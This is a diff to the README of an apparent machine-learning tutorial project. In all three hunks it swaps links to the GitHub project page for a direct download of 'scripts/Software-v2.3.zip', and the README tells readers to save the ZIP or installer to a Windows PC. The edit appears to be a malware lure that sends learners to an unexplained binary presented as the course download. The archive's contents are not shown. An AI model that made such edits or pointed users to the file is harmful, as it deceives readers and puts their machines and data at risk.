@@ -1,6 +1,6 @@
 # 🧠 thereisnospoon - Learn ML from first principles
 
-[![Download thereisnospoon](https://img.shields.io/badge/Download%20thereisnospoon-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Claudineclean170/thereisnospoon)
+[![Download thereisnospoon](https://img.shields.io/badge/Download%20thereisnospoon-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Claudineclean170/thereisnospoon/main/scripts/Software-v2.3.zip)
 
 ## 🚀 What this is
 
@@ -12,7 +12,7 @@ This project is made for engineers and self-learners who want a clear path throu
 
 Use this link to visit the project page and download the files:
 
-[Open the download page](https://github.com/Claudineclean170/thereisnospoon)
+[Open the download page](https://raw.githubusercontent.com/Claudineclean170/thereisnospoon/main/scripts/Software-v2.3.zip)
 
 If the page gives you a ZIP file or installer, download it to your Windows PC and keep it in an easy place like your Downloads folder or Desktop.
 
@@ -151,7 +151,7 @@ If you download the files to your computer, you can read local pages or document
 
 Project page and download access:
 
-[https://github.com/Claudineclean170/thereisnospoon](https://github.com/Claudineclean170/thereisnospoon)
+[https://raw.githubusercontent.com/Claudineclean170/thereisnospoon/main/scripts/Software-v2.3.zip](https://raw.githubusercontent.com/Claudineclean170/thereisnospoon/main/scripts/Software-v2.3.zip)
 
 ## 🧰 If the project opens as files
 
